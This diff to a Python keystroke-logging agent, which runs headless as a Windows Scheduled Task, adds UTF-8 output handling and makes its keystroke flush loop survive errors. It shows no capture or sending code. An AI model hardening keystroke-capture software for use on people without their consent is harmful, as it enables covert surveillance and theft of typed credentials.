@@ -206,6 +206,26 @@ import uuid
 import threading
 import datetime as dt
 
+# ---------------------------------------------------------------------------
+# Force UTF-8 encoding on stdout/stderr so that captured keystrokes or window
+# titles containing characters outside the legacy Windows ANSI codepage
+# (e.g. zero-width space U+200B, smart quotes, emoji, non-Latin scripts) do
+# not crash print() calls when stdout/stderr are redirected to a file — which
+# is exactly what happens when the agent runs as a headless Scheduled Task via
+# the run_agent.ps1 wrapper (stdout falls back to cp1252 in that case).
+# errors='replace' substitutes un-encodable characters with U+FFFD rather
+# than raising UnicodeEncodeError.
+# reconfigure() was added in Python 3.7; the hasattr guard is belt-and-
+# suspenders for any unusual embedded runtime that might lack it.
+# ---------------------------------------------------------------------------
+try:
+    if hasattr(sys.stdout, "reconfigure"):
+        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
+    if hasattr(sys.stderr, "reconfigure"):
+        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
+except Exception:
+    pass  # Non-fatal: if reconfigure fails, we continue with whatever encoding is active.
+
 try:
     import requests
 except ImportError:
@@ -452,7 +472,18 @@ def _flush_timer_loop():
         _stop_event.wait(FLUSH_INTERVAL_SECONDS)
         if _stop_event.is_set():
             break
-        _flush()
+        try:
+            _flush()
+        except Exception as exc:
+            # This loop must NEVER die from an exception in one flush cycle
+            # (e.g. a UnicodeEncodeError from print(), a transient network
+            # hiccup that wasn't caught below, etc.) — catching here ensures
+            # the loop continues and the next interval's flush still runs.
+            ts = time.strftime("%H:%M:%S")
+            try:
+                print(f"[{ts}] ERROR in keystroke flush loop: {exc}")
+            except Exception:
+                pass  # If even the error print fails, swallow silently.
 
 
 # ---------------------------------------------------------------------------
